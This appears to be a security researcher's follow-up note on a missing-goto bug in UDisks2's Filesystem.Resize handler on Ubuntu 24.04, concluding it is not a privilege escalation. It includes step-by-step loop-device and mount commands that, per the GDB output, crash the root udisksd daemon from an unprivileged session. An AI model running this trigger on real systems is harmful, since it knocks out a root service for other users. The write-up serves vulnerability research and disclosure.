# UDisks Filesystem.Resize missing-goto follow-up

Result: `ROOT_PROOF=NO`. This is the same reachable UDisks control-flow bug class as the mounted Check/Repair pass, but I did not validate a stock Ubuntu 24.04 Server uid1001-to-root escalation.

Artifacts:
- `pocs/udisks_resize_missing_goto_probe.sh`
- `logs/udisks-resize-missing-goto-20260517.out`

## Package and default reachability

Target: Ubuntu 24.04.4 LTS, aarch64 Docker systemd target.

Relevant default packages from the target:

```text
udisks2 2.10.1-6ubuntu1.3
libudisks2-0 2.10.1-6ubuntu1.3
libblockdev3 3.1.1-1ubuntu0.1
libblockdev-fs3 3.1.1-1ubuntu0.1
ntfs-3g 1:2022.10.3-1.2ubuntu3.1
xfsprogs 6.6.0-1ubuntu2.1
polkitd 124-2ubuntu1.24.04.3
systemd 255.4-1ubuntu8.15
```

`udisks2.service` is enabled/active and runs `/usr/libexec/udisks2/udisksd` as the system bus service. A real active tty9 `attacker` session had `Active=yes` and `pkcheck` returned rc 0 for:

```text
org.freedesktop.udisks2.loop-setup
org.freedesktop.udisks2.filesystem-mount
org.freedesktop.udisks2.modify-device
```

## Vulnerable code path

In `source/udisks2-src-audit/udisks-2.10.1/src/udiskslinuxfilesystem.c`, `handle_resize()` returns mount-state errors without leaving the handler:

```text
1977-1988: mounted filesystem with no online grow/shrink returns
           "Cannot resize ... if mounted" but has no goto out
1989-1997: unmounted filesystem with no offline grow/shrink returns
           "Cannot resize ... if unmounted" but has no goto out
2019-2026: the handler still checks modify-device authorization
2040-2041: the handler still calls bd_fs_resize(...)
```

That reuses the already-returned `GDBusMethodInvocation *`, which later double-unrefs/crashes in GLib.

## Triggers tested

Mounted NTFS path from an active uid1001 session:

```sh
truncate -s 96M ntfs-mounted.img
mkfs.ntfs -F -Q -L RESIZENTFS ntfs-mounted.img
udisksctl loop-setup -f ntfs-mounted.img --no-user-interaction
udisksctl mount -b /dev/loop0 --no-user-interaction
python3 persistent-resize.py /org/freedesktop/UDisks2/block_devices/loop0 67108864
```

The D-Bus caller received:

```text
org.freedesktop.UDisks2.Error.NotSupported:
Cannot resize filesystem filesystem on /dev/loop0 if mounted
```

GDB on `udisksd` then showed:

```text
HIT return_error inv=0xffff68006dd0 domain=504 code=11
HIT bd_fs_resize device=/dev/loop0 size=67108864 type=ntfs
HIT bd_fs_resize device=/dev/loop0 size=67108864 type=ntfs
HIT return_error inv=0xffff68006dd0 domain=504 code=0
Thread 1 "udisksd" received signal SIGSEGV
g_type_check_instance_is_fundamentally_a -> g_object_unref
```

Unounted XFS was also tested because `xfsprogs` is default installed:

```sh
truncate -s 512M xfs-unmounted.img
mkfs.xfs -f -m reflink=0 -L RESIZEXFS xfs-unmounted.img
udisksctl loop-setup -f xfs-unmounted.img --no-user-interaction
python3 persistent-resize.py /org/freedesktop/UDisks2/block_devices/loop1 402653184
```

This path did not hit the intended mount-state error; libblockdev attempted a root-side resize and failed normally:

```text
Error resizing filesystem on /dev/loop1:
Process reported exit code 1:
[EXPERIMENTAL] try to shrink unused space 98304, old size is 131072
xfs_growfs: XFS_IOC_FSGROWFSDATA xfsctl failed: Invalid argument
```

Strace showed fixed root helper execution with fixed argv and a libblockdev temp mountpoint:

```text
execve("/usr/sbin/xfs_db", ["xfs_db", "-r", "-c", "info", "/dev/loop1"], ... "USER=root" ...)
execve("/usr/sbin/xfs_growfs", ["xfs_growfs", "-D", "98304", "/tmp/blockdev.OYFOP3"], ... "USER=root" ...)
```

## Why it is not an LPE

The mounted NTFS trigger proves the missing-goto bug and root-daemon crash, but I did not get control of a root executable path, root argv, root environment, root-owned write target, or instruction pointer. The filesystem was mounted by UDisks as:

```text
/media/attacker/RESIZENTFS /dev/loop0 ntfs3 rw,nosuid,nodev,relatime,uid=1001,gid=1001
```

The XFS path proves active users can invoke some root filesystem helpers against their own loop devices, but the helper argv is fixed and points only at `/dev/loopN` or a libblockdev-created `/tmp/blockdev.*` mountpoint. No marker was created in `/root`, `/run`, or `/tmp`, and `udisksd` was restarted/healthy after cleanup.

Conclusion: useful UDisks bug evidence, but not a valid Ubuntu Security LPE under this goal.
